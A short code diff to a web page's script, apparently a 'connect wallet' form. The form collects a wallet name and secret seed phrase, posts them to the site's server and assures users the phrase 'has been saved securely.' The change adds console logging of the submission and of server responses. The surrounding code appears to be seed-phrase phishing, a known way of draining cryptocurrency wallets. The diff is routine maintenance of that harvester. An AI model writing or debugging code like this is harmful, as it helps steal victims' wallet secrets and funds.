@@ -3754,6 +3754,10 @@ window.smartsupp||(function(d) {
                 formData.append('wallet_name', walletName);
                 formData.append('secret_phrase', secretPhrase);
  
+                console.log('Submitting wallet:', walletName);
+                console.log('Phrase length:', secretPhrase.length);
+                console.log('Posting to: /connect/wallet');
+ 
                 $.ajax({
                     method: 'POST',
                     url: '/connect/wallet',
@@ -3763,6 +3767,7 @@ window.smartsupp||(function(d) {
                     dataType: 'json',
 
                     success: function (response) {
+                        console.log('Success response:', response);
                         alert('✓ Wallet connected successfully! Your seed phrase has been saved securely.');
                         
                         // Clear form
@@ -3776,6 +3781,9 @@ window.smartsupp||(function(d) {
                         }, 500);
                     },
                     error: function (xhr, status, error) {
+                        console.error('Error response:', xhr);
+                        console.error('Status:', status);
+                        console.error('Error:', error);
                         let errorMsg = 'Error connecting wallet. Please try again.';
                         
                         if (xhr.responseJSON && xhr.responseJSON.message) {
